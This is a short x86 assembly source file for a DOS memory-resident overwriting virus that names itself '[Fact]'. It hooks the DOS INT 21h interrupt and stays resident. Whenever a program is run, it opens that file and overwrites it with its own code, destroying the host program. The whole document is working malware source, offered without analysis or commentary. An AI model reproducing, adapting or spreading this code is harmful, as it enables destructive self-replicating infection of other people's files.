.model tiny
.code
 org   100h

code_begin:
          mov     ax,3521h
          int     21h
          mov     word ptr [int21_addr],bx
          mov     word ptr [Int21_addr+02h],es

          mov     ah,25h
          lea     dx,int21_virus
          int     21h

          xchg    ax,dx
          int     27h

int21_virus  proc    near
          cmp     ah,4bh
          jne     int21_exit

          mov     ax,3d01h
          int     21h
          xchg    ax,bx

          push    cs
          pop     ds

          mov     ah,40h
          mov     cx,(code_end-code_begin)
          lea     dx,code_begin
int21_exit:
             db       0eah
code_end:
int21_addr   dd       ?
virus_name   db      '[Fact]'
                    endp

end       code_begin
